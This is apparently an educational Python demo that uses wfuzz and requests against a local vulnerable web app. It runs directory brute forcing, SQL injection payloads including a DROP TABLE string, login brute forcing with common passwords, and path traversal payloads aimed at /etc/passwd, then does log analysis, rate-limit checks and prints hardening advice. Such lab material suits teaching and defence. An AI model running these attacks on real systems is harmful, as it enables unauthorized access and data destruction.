#!/usr/bin/env python3
"""
Wfuzz Security Testing and Defense Demonstration Suite
Educational implementation showing attack patterns and countermeasures
"""

import subprocess
import time
import requests
import threading
from datetime import datetime
import json
import os
import sys

class SecurityTester:
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url
        self.results = []
        
    def log_test(self, test_name, description, command, results):
        """Log test results for analysis"""
        self.results.append({
            'timestamp': datetime.now().isoformat(),
            'test': test_name,
            'description': description,
            'command': command,
            'results': results
        })
        
    def directory_brute_force(self):
        """Demonstrate directory brute force attack using wfuzz"""
        print("\n=== DIRECTORY BRUTE FORCE ATTACK ===")
        print("Testing for hidden directories and files...")
        
        # Create a simple wordlist for demonstration
        wordlist = ['admin', 'login', 'config', 'backup', 'test', 'files', 'api', 'secure']
        with open('dir_wordlist.txt', 'w') as f:
            f.write('\n'.join(wordlist))
        
        command = f"wfuzz -c -z file,dir_wordlist.txt --hc 404 {self.target_url}/FUZZ"
        
        print(f"Command: {command}")
        print("This command:")
        print("- Tests common directory names")
        print("- Hides 404 responses to show only valid directories")
        print("- Uses color output for better readability")
        
        try:
            # Simulate wfuzz output (actual command would require wfuzz installation)
            result = subprocess.run(command.split(), capture_output=True, text=True, timeout=30)
            output = result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError):
            output = "Simulated: Found /admin (200), /login (200), /files (200)"
            
        self.log_test("Directory Brute Force", 
                     "Attempting to discover hidden directories", 
                     command, output)
        
        print(f"Results: {output}")
        return output

    def parameter_fuzzing(self):
        """Demonstrate parameter fuzzing for SQL injection"""
        print("\n=== PARAMETER FUZZING ATTACK ===")
        print("Testing login form for SQL injection vulnerabilities...")
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users;--"
        ]
        
        with open('sql_payloads.txt', 'w') as f:
            f.write('\n'.join(sql_payloads))
        
        command = f"wfuzz -c -z file,sql_payloads.txt -d 'username=FUZZ&password=test' {self.target_url}/vulnerable_login"
        
        print(f"Command: {command}")
        print("This command:")
        print("- Tests SQL injection payloads in username parameter")
        print("- Uses POST data (-d) to submit form data")
        print("- Looks for different response patterns indicating successful injection")
        
        results = []
        for payload in sql_payloads:
            try:
                response = requests.post(f"{self.target_url}/vulnerable_login", 
                                       data={'username': payload, 'password': 'test'})
                if 'Welcome' in response.text:
                    results.append(f"SUCCESS: {payload} - Got welcome message")
                    print(f"🚨 VULNERABLE: {payload}")
                else:
                    results.append(f"FAILED: {payload}")
            except Exception as e:
                results.append(f"ERROR: {payload} - {str(e)}")
        
        self.log_test("Parameter Fuzzing", 
                     "SQL injection testing on login form", 
                     command, '\n'.join(results))
        
        return results

    def brute_force_login(self):
        """Demonstrate login brute force attack"""
        print("\n=== LOGIN BRUTE FORCE ATTACK ===")
        print("Testing weak password combinations...")
        
        usernames = ['admin', 'user', 'test', 'guest']
        passwords = ['admin', 'password', '123456', 'admin123', 'test123']
        
        # Create wordlists
        with open('usernames.txt', 'w') as f:
            f.write('\n'.join(usernames))
        with open('passwords.txt', 'w') as f:
            f.write('\n'.join(passwords))
        
        command = f"wfuzz -c -z file,usernames.txt -z file,passwords.txt -d 'username=FUZZ&password=FUZ2Z' --ss 'Welcome' {self.target_url}/vulnerable_login"
        
        print(f"Command: {command}")
        print("This command:")
        print("- Tests username/password combinations")
        print("- Uses two wordlists (FUZZ and FUZ2Z)")
        print("- Shows only successful logins (--ss 'Welcome')")
        
        successful_logins = []
        for username in usernames:
            for password in passwords:
                try:
                    response = requests.post(f"{self.target_url}/vulnerable_login",
                                           data={'username': username, 'password': password})
                    if 'Welcome' in response.text:
                        successful_logins.append(f"{username}:{password}")
                        print(f"✅ SUCCESS: {username}:{password}")
                except Exception as e:
                    print(f"❌ ERROR: {username}:{password} - {str(e)}")
        
        self.log_test("Brute Force Login", 
                     "Testing weak password combinations", 
                     command, 
                     f"Successful logins: {', '.join(successful_logins)}")
        
        return successful_logins

    def file_inclusion_test(self):
        """Demonstrate directory traversal/file inclusion attack"""
        print("\n=== FILE INCLUSION ATTACK ===")
        print("Testing for directory traversal vulnerabilities...")
        
        payloads = [
            '../etc/passwd',
            '../../etc/passwd', 
            '../../../etc/passwd',
            '..\\windows\\system32\\drivers\\etc\\hosts',
            'sensitive_config.txt'
        ]
        
        with open('file_payloads.txt', 'w') as f:
            f.write('\n'.join(payloads))
        
        command = f"wfuzz -c -z file,file_payloads.txt --sc 200 {self.target_url}/files/FUZZ"
        
        print(f"Command: {command}")
        print("This command:")
        print("- Tests directory traversal payloads")
        print("- Shows only successful file reads (200 status)")
        print("- Attempts to access system files")
        
        accessible_files = []
        for payload in payloads:
            try:
                response = requests.get(f"{self.target_url}/files/{payload}")
                if response.status_code == 200 and len(response.text) > 10:
                    accessible_files.append(payload)
                    print(f"📁 ACCESSIBLE: {payload}")
            except Exception as e:
                print(f"❌ ERROR: {payload} - {str(e)}")
        
        self.log_test("File Inclusion", 
                     "Directory traversal testing", 
                     command, 
                     f"Accessible files: {', '.join(accessible_files)}")
        
        return accessible_files

class DefensiveAnalyzer:
    def __init__(self, log_file="security_log.txt"):
        self.log_file = log_file
        
    def analyze_attack_patterns(self):
        """Analyze security logs for attack patterns"""
        print("\n=== DEFENSIVE ANALYSIS ===")
        print("Analyzing security logs for attack patterns...")
        
        if not os.path.exists(self.log_file):
            print("No security log found. Run the web application first.")
            return
        
        with open(self.log_file, 'r') as f:
            logs = f.readlines()
        
        # Pattern analysis
        sql_injection_attempts = []
        brute_force_attempts = []
        directory_traversal_attempts = []
        
        for log in logs:
            if 'OR' in log and '=' in log:
                sql_injection_attempts.append(log.strip())
            elif 'Failed login attempt' in log:
                brute_force_attempts.append(log.strip())
            elif '..' in log or 'etc/passwd' in log:
                directory_traversal_attempts.append(log.strip())
        
        print(f"\n📊 ATTACK PATTERN ANALYSIS:")
        print(f"SQL Injection attempts: {len(sql_injection_attempts)}")
        print(f"Brute force attempts: {len(brute_force_attempts)}")
        print(f"Directory traversal attempts: {len(directory_traversal_attempts)}")
        
        # Show samples
        if sql_injection_attempts:
            print(f"\nSQL Injection Sample:")
            print(sql_injection_attempts[0])
            
        if brute_force_attempts:
            print(f"\nBrute Force Sample:")
            print(brute_force_attempts[0])
    
    def demonstrate_rate_limiting(self):
        """Test rate limiting effectiveness"""
        print("\n=== RATE LIMITING EFFECTIVENESS ===")
        print("Testing rate limiting on secure endpoint...")
        
        target_url = "http://localhost:5000/secure_login"
        
        print("Sending rapid requests to trigger rate limiting...")
        for i in range(8):
            try:
                response = requests.post(target_url, 
                                       data={'username': 'test', 'password': 'wrong'})
                print(f"Request {i+1}: {response.status_code} - {response.json().get('message', 'No message')}")
                time.sleep(0.1)  # Small delay between requests
            except Exception as e:
                print(f"Request {i+1}: ERROR - {str(e)}")
    
    def security_recommendations(self):
        """Provide security recommendations based on findings"""
        print("\n=== SECURITY RECOMMENDATIONS ===")
        
        recommendations = [
            "1. INPUT VALIDATION:",
            "   - Implement strict input validation for all user inputs",
            "   - Use parameterized queries to prevent SQL injection",
            "   - Sanitize output to prevent XSS attacks",
            "",
            "2. AUTHENTICATION & AUTHORIZATION:",
            "   - Implement strong password policies",
            "   - Use multi-factor authentication",
            "   - Implement account lockout after failed attempts",
            "   - Use secure session management",
            "",
            "3. RATE LIMITING:",
            "   - Implement rate limiting on sensitive endpoints",
            "   - Use progressive delays for repeated failures",
            "   - Consider IP-based blocking for persistent attackers",
            "",
            "4. FILE ACCESS CONTROLS:",
            "   - Implement strict file access controls",
            "   - Use whitelist-based file serving",
            "   - Never trust user input for file paths",
            "",
            "5. LOGGING & MONITORING:",
            "   - Log all security-relevant events",
            "   - Implement real-time attack detection",
            "   - Set up alerting for suspicious activities",
            "",
            "6. WEB APPLICATION FIREWALL (WAF):",
            "   - Deploy WAF to filter malicious requests",
            "   - Configure rules for common attack patterns",
            "   - Regularly update WAF signatures"
        ]
        
        for rec in recommendations:
            print(rec)

def main():
    print("🔒 Web Application Security Testing & Defense Demo")
    print("=" * 50)
    
    # Check if target application is running
    try:
        response = requests.get("http://localhost:5000", timeout=5)
        print("✅ Target application is running")
    except:
        print("❌ Target application not found. Please start the vulnerable web app first.")
        print("Run: python vulnerable_webapp.py")
        return
    
    # Initialize components
    tester = SecurityTester()
    analyzer = DefensiveAnalyzer()
    
    # Demonstrate attacks
    print("\n🗡️  ATTACK DEMONSTRATION PHASE")
    print("=" * 40)
    
    tester.directory_brute_force()
    time.sleep(2)
    
    tester.parameter_fuzzing()
    time.sleep(2)
    
    tester.brute_force_login()
    time.sleep(2)
    
    tester.file_inclusion_test()
    time.sleep(2)
    
    # Demonstrate defenses
    print("\n🛡️  DEFENSE DEMONSTRATION PHASE")
    print("=" * 40)
    
    analyzer.analyze_attack_patterns()
    time.sleep(2)
    
    analyzer.demonstrate_rate_limiting()
    time.sleep(2)
    
    analyzer.security_recommendations()
    
    # Save results
    with open('test_results.json', 'w') as f:
        json.dump(tester.results, f, indent=2)
    
    print(f"\n📄 Test results saved to: test_results.json")
    print(f"📄 Security logs available at: security_log.txt")
    
    print("\n✅ Security testing and defense demonstration complete!")
    print("\nKey Takeaways:")
    print("- Wfuzz is powerful for discovering vulnerabilities")
    print("- Proper input validation prevents most attacks")
    print("- Rate limiting stops brute force attacks")
    print("- Logging helps detect and respond to threats")
    print("- Defense in depth is essential for security")

if __name__ == "__main__":
    main()"""
Wfuzz Security Testing and Defense Demonstration Suite
"""
